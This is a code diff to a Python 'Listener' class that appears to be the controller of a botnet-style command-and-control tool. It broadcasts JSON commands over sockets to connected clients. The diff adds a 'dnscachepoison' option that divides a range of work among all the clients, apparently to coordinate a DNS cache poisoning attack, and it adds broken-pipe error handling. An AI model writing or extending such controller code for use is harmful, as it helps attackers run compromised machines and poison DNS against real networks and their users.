@@ -64,7 +64,10 @@ class Listener:
     # function that sends json objects through socket connection
     def reliable_send(self, data, i):
         json_data = json.dumps(data).encode('utf-8')
-        self.connections[i].send(json_data)
+        try:
+            self.connections[i].send(json_data)
+        except BrokenPipeError:
+            print("[!] Broken Pipe.")
 
     # function that receives json objects through socket connection
     def reliable_receive(self, i):
@@ -110,12 +113,26 @@ class Listener:
                     print("[!] Connection not found.")
 
             elif command[0] == "sendall":
-                json_data = json.dumps(command[1:]).encode('utf-8')
-                for connection in self.connections:
-                    try:
-                        connection.send(json_data)
-                    except Exception:
-                        print("[!] One connection not found.")
+                if command[1] == "dnscachepoison":
+                    step = 5 // len(self.connections)
+                    i = 1
+                    for connection in self.connections:
+                        new_command = command[:]
+                        new_command.append(str(i))
+                        new_command.append(str(i+step))
+                        i = i + step + 1
+                        json_data = json.dumps(new_command[1:]).encode('utf-8')
+                        try:
+                            connection.send(json_data)
+                        except Exception:
+                            print("[!] One connection not found.")
+                else:
+                    json_data = json.dumps(command[1:]).encode('utf-8')
+                    for connection in self.connections:
+                        try:
+                            connection.send(json_data)
+                        except Exception:
+                            print("[!] One connection not found.")
 
             else:
                 print("[-] Command does not exist.")
